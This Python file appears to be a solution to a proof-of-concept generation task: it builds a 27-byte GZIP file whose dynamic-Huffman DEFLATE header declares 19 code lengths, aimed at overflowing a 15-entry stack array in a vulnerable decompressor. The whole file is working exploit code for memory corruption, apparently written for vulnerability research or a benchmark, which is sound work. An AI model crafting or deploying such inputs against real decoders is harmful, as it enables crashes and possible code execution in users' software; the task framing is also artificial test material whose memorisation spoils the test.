import zlib

class Solution:
    def solve(self, src_path: str) -> bytes:
        """
        Generate a PoC that triggers the vulnerability.

        Args:
            src_path: Path to the vulnerable source code tarball

        Returns:
            bytes: The PoC input that should trigger the vulnerability
        """
        
        class BitStream:
            """A helper class to write bits and pack them into bytes (LSB-first)."""
            def __init__(self):
                self.bits = []

            def write(self, value: int, num_bits: int):
                """Writes the least significant `num_bits` of `value` to the stream."""
                for i in range(num_bits):
                    self.bits.append((value >> i) & 1)

            def get_bytes(self) -> bytes:
                """Pads the stream to a full byte and returns the byte string."""
                while len(self.bits) % 8 != 0:
                    self.bits.append(0)
                
                byte_array = bytearray()
                for i in range(0, len(self.bits), 8):
                    byte = 0
                    for j in range(8):
                        byte |= self.bits[i + j] << j
                    byte_array.append(byte)
                return bytes(byte_array)

        # The vulnerability is a stack buffer overflow in Huffman decoding within GZIP.
        # An array for code lengths is sized to 15, but up to 19 can be specified.
        # We craft a GZIP stream with a DEFLATE block that declares 19 code lengths
        # (HCLEN=15) and provides enough data to trigger an out-of-bounds write
        # on the 16th element.

        # 1. Standard GZIP header (10 bytes)
        gzip_header = b'\x1f\x8b\x08\x00\x00\x00\x00\x00\x00\x00'

        # 2. Crafted DEFLATE stream
        bs = BitStream()
        
        # DEFLATE Block Header: Final block, Dynamic Huffman codes
        bs.write(1, 1)  # BFINAL = 1
        bs.write(2, 2)  # BTYPE = 2

        # Huffman Tree Definition
        bs.write(0, 5)   # HLIT = 0 (257 literal/length codes)
        bs.write(0, 5)   # HDIST = 0 (1 distance code)
        bs.write(15, 4)  # HCLEN = 15 (19 code length codes, 15+4=19)

        # Provide 16 code lengths (3 bits each) to cause a write to index 15
        # of the 15-element buffer (indices 0-14).
        for _ in range(16):
            bs.write(1, 3) # A dummy value for the code length

        # Total bits: 17 (header) + 16 * 3 (lengths) = 65 bits.
        # This packs into ceil(65/8) = 9 bytes.
        poc_deflate = bs.get_bytes()

        # 3. GZIP trailer (8 bytes): CRC32 and ISIZE for uncompressed data (empty)
        crc32 = zlib.crc32(b'')
        isize = 0
        gzip_trailer = crc32.to_bytes(4, 'little') + isize.to_bytes(4, 'little')
        
        # Concatenate parts to form the final 27-byte PoC.
        return gzip_header + poc_deflate + gzip_trailer
